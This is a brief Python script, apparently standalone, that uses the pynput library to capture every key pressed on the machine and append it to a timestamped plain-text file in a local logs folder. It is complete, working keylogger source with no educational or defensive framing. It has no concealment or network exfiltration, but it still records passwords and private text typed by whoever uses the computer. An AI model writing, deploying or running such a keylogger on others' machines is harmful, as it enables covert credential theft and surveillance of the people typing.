from pynput import keyboard
import os
from datetime import datetime

# Set log file path
log_dir = "logs"
os.makedirs(log_dir, exist_ok=True)
filename = os.path.join(log_dir, f"keylog_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt")

def write_to_file(key):
    try:
        with open(filename, "a") as f:
            if hasattr(key, 'char'):
                f.write(f"{key.char}")
            else:
                f.write(f"[{key.name}]")
    except Exception as e:
        print(f"Error writing to file: {e}")

# Listener function
def on_press(key):
    write_to_file(key)

# Start listening
with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
